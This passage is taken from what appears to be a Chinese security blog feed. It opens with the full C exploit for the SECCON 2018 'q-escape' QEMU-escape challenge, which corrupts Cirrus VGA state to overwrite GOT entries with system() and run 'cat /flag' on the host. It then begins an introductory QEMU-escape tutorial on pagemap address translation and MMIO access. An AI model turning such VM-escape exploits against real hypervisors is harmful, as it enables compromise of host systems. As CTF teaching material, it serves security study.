class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> vga_addr = <span class="number">0xa0000</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> vga_size = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *vga_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_sr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(idx, <span class="number">0x3c4</span>);</span><br><span class="line">    outb(val, <span class="number">0x3c5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vga_mem_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint8_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint8_t</span> *)(vga_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_latch</span><span class="params">(<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    a = vga_mem[(value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>]; <span class="comment">// write hight</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    a = vga_mem[value &amp; <span class="number">0xffff</span>]; <span class="comment">// write low</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vga_mem = mmap(<span class="literal">NULL</span>, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);</span><br><span class="line">    <span class="keyword">if</span> (!vga_mem)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(<span class="number">0x3b0</span>, <span class="number">0x30</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;cannot ioperm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">7</span>, <span class="number">1</span>);       <span class="comment">// bypass first if</span></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">4</span>);    <span class="comment">// v7==4</span></span><br><span class="line">    set_sr(<span class="number">0xcd</span>, <span class="number">0x10</span>); <span class="comment">// vs[0x10]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> bss = <span class="number">0x109e000</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_logfile = <span class="number">0x10CCBE0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> vfprintf_got = <span class="number">0xee7bb0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> system_plt = <span class="number">0x409dd0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> printf_chk_got = <span class="number">0xee7028</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_log = <span class="number">0x9726E8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cat_flag[] = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> cur_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a = vga_mem[<span class="number">1</span>];</span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    set_latch(bss);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;cat_flag[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, cat_flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(qemu_logfile - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;bss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(vfprintf_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;system_plt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(printf_chk_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;qemu_log;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">2</span>);</span><br><span class="line">    vga_mem_write(<span class="number">0x18100</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315163823703.png"                      alt="image-20230315163823703"                ></p><hr><p>参考链接:<br>  <a class="link"   href="https://www.anquanke.com/post/id/224199#h3-11" >https://www.anquanke.com/post/id/224199#h3-11<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://devcraft.io/2018/11/22/q-escape-seccon-2018.html" >https://devcraft.io/2018/11/22/q-escape-seccon-2018.html<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>  <a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip" >https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;许久没有更新，前段时间一直考试所以一直拖着了。&lt;/p&gt;
&lt;h2 id=&quot;设备分析&quot;&gt;&lt;a href=&quot;#设备分析&quot; class=&quot;headerlink&quot; title=&quot;设备分析&quot;&gt;&lt;/a&gt;设备分析&lt;/h2&gt;&lt;p&gt;首先看看开了什么保护&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
    <category term="vga" scheme="https://cv196082.gitee.io/tags/vga/"/>
    
  </entry>
  
  <entry>
    <title>qemu逃逸入门</title>
    <link href="https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2023-02-05T09:39:57.000Z</published>
    <updated>2023-03-21T07:58:23.390Z</updated>
    
    <content type="html"><![CDATA[<p>首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。</p><p>在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。</p><h2 id="qemu的内存结构"><a href="#qemu的内存结构" class="headerlink" title="qemu的内存结构"></a>qemu的内存结构</h2><p>qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。</p><h3 id="qemu的地址转化"><a href="#qemu的地址转化" class="headerlink" title="qemu的地址转化"></a>qemu的地址转化</h3><p>用户虚拟地址-&gt;用户物理地址</p><p>用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。</p><p>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。</p><ul><li>  Bits 0-54 page frame number (PFN) if present</li><li>  Bits 0-4 swap type if swapped</li><li>  Bits 5-54 swap offset if swapped</li><li>  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</li><li>  Bit 56 page exclusively mapped (since 4.2)</li><li>  Bits 57-60 zero</li><li>  Bit 61 page is file-page or shared-anon (since 3.5)</li><li>  Bit 62 page swapped</li><li>  Bit 63 page present</li></ul><p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p><p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p><p>2、 读取长度为<code>64bits</code>的数据项</p><p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p><p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p><p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p><p>对应代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *userbuf;</span><br><span class="line">    <span class="keyword">uint64_t</span> userbuf_pa;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem:\t%p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap userbuf&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(usebuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    userbuf_pa = va2pa(userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_va:\t%p\n&quot;</span>,userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_pa:\t%p\n&quot;</span>,(<span class="keyword">void</span> *)userbuf_pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。</p><h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p>而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t01a97028b7de9d6955.png"                      alt="t01a97028b7de9d6955"                ></p><ul><li>  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li><li>  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li><li>  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li><li>  Bits 31-4：Base Address，以 16 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/mmio_mem.png"                      alt="mmio_mem"                ></p><p><strong>在用户态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 